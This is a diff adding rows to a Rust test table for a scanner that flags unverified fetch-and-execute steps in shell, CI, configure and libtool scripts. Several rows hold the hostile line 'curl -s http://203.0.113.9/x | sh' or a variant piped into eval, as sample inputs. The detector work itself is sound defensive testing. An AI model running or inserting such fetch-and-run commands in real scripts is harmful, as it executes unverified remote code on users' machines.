@@ -178,6 +178,55 @@ fn each_language_is_read() {
             "#!/bin/sh\ncurl -s http://203.0.113.9/x | sh\n",
             &[L::FetchExecuteUnverified],
         ),
+        (
+            "tool_script",
+            "scripts/gen.sh",
+            "curl -s http://203.0.113.9/x | sh\n",
+            &[L::FetchExecuteUnverified],
+        ),
+        (
+            "ci_script",
+            ".github/workflows/x.sh",
+            "curl -s http://203.0.113.9/x | sh\n",
+            &[],
+        ),
+        (
+            "ci_folder",
+            "ci/x.sh",
+            "curl -s http://203.0.113.9/x | sh\n",
+            &[],
+        ),
+        (
+            "test_script",
+            "tests/x.sh",
+            "curl -s http://203.0.113.9/x | sh\n",
+            &[],
+        ),
+        (
+            "runtime_script",
+            "src/app/launch.sh",
+            "curl -s http://203.0.113.9/x | sh\n",
+            &[],
+        ),
+        (
+            "command_in_a_variable",
+            "autogen.sh",
+            "$TOOL --flag\n\"$@\"\n",
+            &[],
+        ),
+        ("eval_of_a_parameter", "configure", "eval \"$1\"\n", &[]),
+        (
+            "byte_swap_in_libtool",
+            "aclocal.m4",
+            "eval `echo $x | tr ab ba`\n",
+            &[],
+        ),
+        (
+            "still_flows",
+            "configure",
+            "curl -s http://203.0.113.9/x | eval \"$(cat)\"\n",
+            &[L::FetchExecuteUnverified],
+        ),
     ];
     for (name, path, text, want) in rows {
         assert_eq!(&laws(name, &[(path, text)]), want, "{name}");
